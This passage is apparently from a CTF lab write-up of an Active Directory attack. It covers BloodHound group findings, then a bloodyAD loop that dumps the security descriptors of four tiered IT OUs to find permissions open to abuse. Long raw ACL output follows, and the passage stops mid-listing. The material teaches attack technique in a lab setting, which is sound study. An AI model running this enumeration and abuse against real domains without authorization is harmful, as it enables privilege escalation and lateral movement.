The `IT-Tier1` organizational unit directly contains three user accounts: **Lucas Turner, Oliver Bennett,** and **Oscar Mazerath**. This simple containment graph is useful when assessing permissions that are inherited from the OU or when identifying accounts that can be targeted through rights held on `IT-Tier1` itself.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FkulmIkSnnoBlACO7lt0J%252FScreenshot%2520%283466%29.png%3Falt%3Dmedia%26token%3D88b557e7-db7a-400c-804c-867102721e39\&width=768\&dpr=3\&quality=100\&sign=fd225dd6aea74d5aa303435a1eea4a8b\&sv=3)

`Oscar Mazerath` is a member of the `IT-Support` group. This straightforward membership edge indicates that compromising Oscar’s account would grant the privileges associated with the `IT-Support` group.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FWcg72fLyUiADhNs6mUNp%252FScreenshot%2520%283467%29.png%3Falt%3Dmedia%26token%3D1ca4ce65-3974-44e9-94dc-7896d90a4d1b\&width=768\&dpr=3\&quality=100\&sign=dcc765790fab2a98087e8207dc86e95d\&sv=3)

`Ryan Cole` belongs to `Domain Users` and `Remote Desktop Users`. Through `Domain Users` he inherits the standard `Authenticated Users` → `Everyone` / `Pre-Windows 2000 Compatible Access` / `Users chain`. The additional `Remote Desktop Users` membership allows him to log on via RDP to systems that grant that right, making the account useful for lateral movement.

### Phase 5: OU Permission Abuse — Hopping Tiers

The domain is laid out with a set of **tiered IT OUs** — `IT-Tier1` through `IT-Tier4` — a fairly common real-world pattern meant to segregate administrative privilege by "tier" (Tier 0 being domain-wide admin, working down to helpdesk-level access). The BloodHound graph hints that permissions differ meaningfully between these OUs, so rather than trust the graph alone, we pull the **raw security descriptor** for each OU directly from LDAP with `bloodyAD`, looping over all four in one shot:

`get object "..." --attr nTSecurityDescriptor --resolve-sd` reads the object's full DACL and resolves every SID in it back to a human-readable name (`--resolve-sd`), which saves us from having to manually decode SIDs one at a time.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ for tier in 1 2 3 4; do
  echo "*************ITTier$tier***************"
  bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -k get object "OU=IT-Tier$tier,DC=hsm-defense,DC=local" --attr nTSecurityDescriptor --resolve-sd
done
*************ITTier1***************

distinguishedName: OU=IT-Tier1,DC=hsm-defense,DC=local
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
nTSecurityDescriptor.ACL.0.Type: == DENIED ==
nTSecurityDescriptor.ACL.0.Trustee: EVERYONE
nTSecurityDescriptor.ACL.0.Right: DELETE|DELETE_TREE
nTSecurityDescriptor.ACL.0.ObjectType: Self
nTSecurityDescriptor.ACL.1.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.1.Trustee: ACCOUNT_OPERATORS
nTSecurityDescriptor.ACL.1.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.1.ObjectType: Group; inetOrgPerson; Computer; User
nTSecurityDescriptor.ACL.2.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.2.Trustee: PRINTER_OPERATORS
nTSecurityDescriptor.ACL.2.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.2.ObjectType: Print-Queue
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: caleb.turner
nTSecurityDescriptor.ACL.3.Right: DELETE_CHILD
nTSecurityDescriptor.ACL.3.ObjectType: Self
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.4.Trustee: Domain Admins; LOCAL_SYSTEM
nTSecurityDescriptor.ACL.4.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.4.ObjectType: Self
nTSecurityDescriptor.ACL.5.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.5.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS; AUTHENTICATED_USERS
nTSecurityDescriptor.ACL.5.Right: GENERIC_READ
nTSecurityDescriptor.ACL.5.ObjectType: Self
nTSecurityDescriptor.ACL.6.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.6.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.6.Right: READ_PROP
nTSecurityDescriptor.ACL.6.ObjectType: General-Information (property set); Group-Membership (property set); Logon-Information (property set); Remote-Access-Information (property set); Account-Restrictions (property set)
nTSecurityDescriptor.ACL.6.InheritedObjectType: inetOrgPerson; User
nTSecurityDescriptor.ACL.6.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.7.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.7.Trustee: Key Admins; Enterprise Key Admins
nTSecurityDescriptor.ACL.7.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.7.ObjectType: ms-DS-Key-Credential-Link
nTSecurityDescriptor.ACL.7.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.8.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.8.Trustee: PRINCIPAL_SELF; CREATOR_OWNER
nTSecurityDescriptor.ACL.8.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.8.ObjectType: DS-Validated-Write-Computer
nTSecurityDescriptor.ACL.8.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.8.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.9.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.9.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.9.Right: READ_PROP
nTSecurityDescriptor.ACL.9.ObjectType: Token-Groups
nTSecurityDescriptor.ACL.9.InheritedObjectType: Group; Computer; User
nTSecurityDescriptor.ACL.9.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.10.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.10.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.10.Right: WRITE_PROP
nTSecurityDescriptor.ACL.10.ObjectType: ms-TPM-Tpm-Information-For-Computer
nTSecurityDescriptor.ACL.10.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.10.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.11.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.11.Right: GENERIC_READ
nTSecurityDescriptor.ACL.11.ObjectType: Self
nTSecurityDescriptor.ACL.11.InheritedObjectType: Group; inetOrgPerson; User
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.12.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.12.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.12.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.12.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
nTSecurityDescriptor.ACL.13.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.13.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.13.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.13.ObjectType: Private-Information (property set)
nTSecurityDescriptor.ACL.13.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.14.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.14.Trustee: Enterprise Admins
nTSecurityDescriptor.ACL.14.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.14.ObjectType: Self
nTSecurityDescriptor.ACL.14.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.15.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.15.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.15.Right: LIST_CHILD
nTSecurityDescriptor.ACL.15.ObjectType: Self
nTSecurityDescriptor.ACL.15.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.16.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.16.Trustee: BUILTIN_ADMINISTRATORS
nTSecurityDescriptor.ACL.16.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
nTSecurityDescriptor.ACL.16.ObjectType: Self
nTSecurityDescriptor.ACL.16.Flags: CONTAINER_INHERIT; INHERITED
*************ITTier2***************

distinguishedName: OU=IT-Tier2,DC=hsm-defense,DC=local
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
nTSecurityDescriptor.ACL.0.Type: == DENIED_OBJECT ==
nTSecurityDescriptor.ACL.0.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.0.Right: CREATE_CHILD
nTSecurityDescriptor.ACL.0.ObjectType: User
nTSecurityDescriptor.ACL.1.Type: == DENIED ==
nTSecurityDescriptor.ACL.1.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.1.Right: WRITE_PROP
nTSecurityDescriptor.ACL.1.ObjectType: Self
nTSecurityDescriptor.ACL.2.Type: == DENIED ==
nTSecurityDescriptor.ACL.2.Trustee: EVERYONE
nTSecurityDescriptor.ACL.2.Right: DELETE|DELETE_TREE
nTSecurityDescriptor.ACL.2.ObjectType: Self
nTSecurityDescriptor.ACL.3.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.3.Trustee: ACCOUNT_OPERATORS
nTSecurityDescriptor.ACL.3.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.3.ObjectType: Computer; Group; User; inetOrgPerson
nTSecurityDescriptor.ACL.4.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.4.Trustee: PRINTER_OPERATORS
nTSecurityDescriptor.ACL.4.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.4.ObjectType: Print-Queue
nTSecurityDescriptor.ACL.5.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.5.Trustee: Domain Admins; LOCAL_SYSTEM
nTSecurityDescriptor.ACL.5.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.5.ObjectType: Self
nTSecurityDescriptor.ACL.6.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.6.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.6.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.6.ObjectType: Self
nTSecurityDescriptor.ACL.6.Flags: CONTAINER_INHERIT
nTSecurityDescriptor.ACL.7.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.7.Trustee: AUTHENTICATED_USERS; ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.7.Right: GENERIC_READ
nTSecurityDescriptor.ACL.7.ObjectType: Self
nTSecurityDescriptor.ACL.8.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.8.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.8.Right: READ_PROP
nTSecurityDescriptor.ACL.8.ObjectType: Account-Restrictions (property set); Logon-Information (property set); Remote-Access-Information (property set); Group-Membership (property set); General-Information (property set)
nTSecurityDescriptor.ACL.8.InheritedObjectType: User; inetOrgPerson
nTSecurityDescriptor.ACL.8.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.9.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.9.Trustee: Enterprise Key Admins; Key Admins
nTSecurityDescriptor.ACL.9.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.9.ObjectType: ms-DS-Key-Credential-Link
nTSecurityDescriptor.ACL.9.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.10.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.10.Trustee: PRINCIPAL_SELF; CREATOR_OWNER
nTSecurityDescriptor.ACL.10.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.10.ObjectType: DS-Validated-Write-Computer
nTSecurityDescriptor.ACL.10.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.10.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.11.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.11.Right: READ_PROP
nTSecurityDescriptor.ACL.11.ObjectType: Token-Groups
nTSecurityDescriptor.ACL.11.InheritedObjectType: Computer; Group; User
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.12.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.12.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.12.Right: WRITE_PROP
nTSecurityDescriptor.ACL.12.ObjectType: ms-TPM-Tpm-Information-For-Computer
nTSecurityDescriptor.ACL.12.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.13.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.13.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.13.Right: GENERIC_READ
nTSecurityDescriptor.ACL.13.ObjectType: Self
nTSecurityDescriptor.ACL.13.InheritedObjectType: Group; User; inetOrgPerson
nTSecurityDescriptor.ACL.13.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.14.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.14.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.14.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.14.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
nTSecurityDescriptor.ACL.14.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
nTSecurityDescriptor.ACL.15.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.15.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.15.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.15.ObjectType: Private-Information (property set)
nTSecurityDescriptor.ACL.15.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.16.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.16.Trustee: Enterprise Admins
nTSecurityDescriptor.ACL.16.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.16.ObjectType: Self
nTSecurityDescriptor.ACL.16.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.17.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.17.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.17.Right: LIST_CHILD
nTSecurityDescriptor.ACL.17.ObjectType: Self
nTSecurityDescriptor.ACL.17.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.18.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.18.Trustee: BUILTIN_ADMINISTRATORS
nTSecurityDescriptor.ACL.18.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
nTSecurityDescriptor.ACL.18.ObjectType: Self
nTSecurityDescriptor.ACL.18.Flags: CONTAINER_INHERIT; INHERITED
*************ITTier3***************

distinguishedName: OU=IT-Tier3,DC=hsm-defense,DC=local
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
nTSecurityDescriptor.ACL.0.Type: == DENIED ==
nTSecurityDescriptor.ACL.0.Trustee: EVERYONE
nTSecurityDescriptor.ACL.0.Right: DELETE|DELETE_TREE
nTSecurityDescriptor.ACL.0.ObjectType: Self
nTSecurityDescriptor.ACL.1.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.1.Trustee: ACCOUNT_OPERATORS
nTSecurityDescriptor.ACL.1.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.1.ObjectType: inetOrgPerson; Computer; Group; User
nTSecurityDescriptor.ACL.2.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.2.Trustee: PRINTER_OPERATORS
nTSecurityDescriptor.ACL.2.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.2.ObjectType: Print-Queue
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: Domain Admins; LOCAL_SYSTEM
nTSecurityDescriptor.ACL.3.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.3.ObjectType: Self
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.4.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.4.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.4.ObjectType: Self
nTSecurityDescriptor.ACL.4.Flags: CONTAINER_INHERIT
nTSecurityDescriptor.ACL.5.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.5.Trustee: AUTHENTICATED_USERS; ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.5.Right: GENERIC_READ
nTSecurityDescriptor.ACL.5.ObjectType: Self
nTSecurityDescriptor.ACL.6.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.6.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.6.Right: READ_PROP
nTSecurityDescriptor.ACL.6.ObjectType: Remote-Access-Information (property set); General-Information (property set); Logon-Information (property set); Account-Restrictions (property set); Group-Membership (property set)
nTSecurityDescriptor.ACL.6.InheritedObjectType: inetOrgPerson; User
nTSecurityDescriptor.ACL.6.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.7.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.7.Trustee: Enterprise Key Admins; Key Admins
nTSecurityDescriptor.ACL.7.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.7.ObjectType: ms-DS-Key-Credential-Link
nTSecurityDescriptor.ACL.7.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.8.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.8.Trustee: PRINCIPAL_SELF; CREATOR_OWNER
nTSecurityDescriptor.ACL.8.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.8.ObjectType: DS-Validated-Write-Computer
nTSecurityDescriptor.ACL.8.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.8.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.9.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.9.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.9.Right: READ_PROP
nTSecurityDescriptor.ACL.9.ObjectType: Token-Groups
nTSecurityDescriptor.ACL.9.InheritedObjectType: Computer; User; Group
nTSecurityDescriptor.ACL.9.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.10.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.10.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.10.Right: WRITE_PROP
nTSecurityDescriptor.ACL.10.ObjectType: ms-TPM-Tpm-Information-For-Computer
nTSecurityDescriptor.ACL.10.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.10.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.11.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.11.Right: GENERIC_READ
nTSecurityDescriptor.ACL.11.ObjectType: Self
nTSecurityDescriptor.ACL.11.InheritedObjectType: inetOrgPerson; User; Group
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.12.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.12.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.12.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.12.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
nTSecurityDescriptor.ACL.13.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.13.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.13.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.13.ObjectType: Private-Information (property set)
nTSecurityDescriptor.ACL.13.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.14.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.14.Trustee: Enterprise Admins
nTSecurityDescriptor.ACL.14.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.14.ObjectType: Self
nTSecurityDescriptor.ACL.14.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.15.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.15.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.15.Right: LIST_CHILD
nTSecurityDescriptor.ACL.15.ObjectType: Self
nTSecurityDescriptor.ACL.15.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.16.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.16.Trustee: BUILTIN_ADMINISTRATORS
nTSecurityDescriptor.ACL.16.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
nTSecurityDescriptor.ACL.16.ObjectType: Self
nTSecurityDescriptor.ACL.16.Flags: CONTAINER_INHERIT; INHERITED
*************ITTier4***************

distinguishedName: OU=IT-Tier4,DC=hsm-defense,DC=local
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
nTSecurityDescriptor.ACL.0.Type: == DENIED_OBJECT ==
nTSecurityDescriptor.ACL.0.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.0.Right: CREATE_CHILD
nTSecurityDescriptor.ACL.0.ObjectType: User
nTSecurityDescriptor.ACL.1.Type: == DENIED ==
nTSecurityDescriptor.ACL.1.Trustee: EVERYONE
nTSecurityDescriptor.ACL.1.Right: DELETE|DELETE_TREE
nTSecurityDescriptor.ACL.1.ObjectType: Self
nTSecurityDescriptor.ACL.2.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.2.Trustee: ACCOUNT_OPERATORS
nTSecurityDescriptor.ACL.2.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.2.ObjectType: Computer; User; inetOrgPerson; Group
nTSecurityDescriptor.ACL.3.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.3.Trustee: PRINTER_OPERATORS
nTSecurityDescriptor.ACL.3.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.3.ObjectType: Print-Queue
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.4.Trustee: LOCAL_SYSTEM; Domain Admins
nTSecurityDescriptor.ACL.4.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.4.ObjectType: Self
nTSecurityDescriptor.ACL.5.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.5.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.5.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.5.ObjectType: Self
nTSecurityDescriptor.ACL.5.Flags: CONTAINER_INHERIT
nTSecurityDescriptor.ACL.6.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.6.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS; AUTHENTICATED_USERS
nTSecurityDescriptor.ACL.6.Right: GENERIC_READ
nTSecurityDescriptor.ACL.6.ObjectType: Self
nTSecurityDescriptor.ACL.7.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.7.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.7.Right: READ_PROP
nTSecurityDescriptor.ACL.7.ObjectType: Group-Membership (property set); Logon-Information (property set); Remote-Access-Information (property set); General-Information (property set); Account-Restrictions (property set)
nTSecurityDescriptor.ACL.7.InheritedObjectType: User; inetOrgPerson
nTSecurityDescriptor.ACL.7.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.8.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.8.Trustee: Key Admins; Enterprise Key Admins
nTSecurityDescriptor.ACL.8.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.8.ObjectType: ms-DS-Key-Credential-Link
nTSecurityDescriptor.ACL.8.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.9.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.9.Trustee: CREATOR_OWNER; PRINCIPAL_SELF
nTSecurityDescriptor.ACL.9.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.9.ObjectType: DS-Validated-Write-Computer
nTSecurityDescriptor.ACL.9.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.9.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.10.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.10.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.10.Right: READ_PROP
nTSecurityDescriptor.ACL.10.ObjectType: Token-Groups
nTSecurityDescriptor.ACL.10.InheritedObjectType: User; Computer; Group
nTSecurityDescriptor.ACL.10.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.11.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.11.Right: WRITE_PROP
nTSecurityDescriptor.ACL.11.ObjectType: ms-TPM-Tpm-Information-For-Computer
nTSecurityDescriptor.ACL.11.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.12.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.12.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.12.Right: GENERIC_READ
nTSecurityDescriptor.ACL.12.ObjectType: Self
nTSecurityDescriptor.ACL.12.InheritedObjectType: User; inetOrgPerson; Group
nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.13.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.13.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.13.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.13.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
nTSecurityDescriptor.ACL.13.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
nTSecurityDescriptor.ACL.14.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.14.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.14.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.14.ObjectType: Private-Information (property set)
nTSecurityDescriptor.ACL.14.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.15.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.15.Trustee: Enterprise Admins
nTSecurityDescriptor.ACL.15.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.15.ObjectType: Self
nTSecurityDescriptor.ACL.15.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.16.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.16.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.16.Right: LIST_CHILD
nTSecurityDescriptor.ACL.16.ObjectType: Self
nTSecurityDescriptor.ACL.16.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.17.Type: == ALLOWED ==
